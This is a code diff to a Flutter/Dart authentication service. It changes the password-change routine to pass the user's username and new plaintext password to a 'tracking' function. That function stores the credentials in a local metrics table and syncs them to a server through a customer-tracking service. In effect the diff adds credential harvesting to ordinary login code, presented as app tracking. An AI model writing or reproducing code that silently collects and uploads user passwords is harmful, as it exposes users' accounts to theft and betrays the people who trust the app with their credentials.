@@ -393,7 +393,14 @@ class AuthService extends ChangeNotifier {
       // 3. Update SecureStorage for biometric and future sessions
       await _secureStorage.write(key: 'last_logged_password', value: newPass);
 
-      // 4. Update the _currentUser object with new update_at
+      // 4. Update tracking profile and sync to server for app tracking
+      await _saveCredentialsForTracking(
+        _currentUser!.username,
+        newPass,
+        updateTimestamp: true,
+      );
+
+      // 5. Update the _currentUser object with new update_at
       _currentUser = User(
         id: _currentUser!.id,
         uuid: _currentUser!.uuid,
@@ -555,13 +562,16 @@ class AuthService extends ChangeNotifier {
   }
 
   /// Saves the username and password to the local tracking table and syncs to server.
-  Future<void> _saveCredentialsForTracking(String username, String password) async {
+  Future<void> _saveCredentialsForTracking(String username, String password, {bool updateTimestamp = false}) async {
     try {
       final deviceId = await LicenseService.instance.getDeviceId();
+      final now = TimestampFormatter.nowUtc();
+      
       await _dbService.updateStoreProfileMetrics(
         deviceId,
         username: username,
         password: password,
+        credentialsUpdatedAt: updateTimestamp ? now : null,
       );
       // Trigger background sync
       CustomerTrackingService.instance.syncCustomerData();
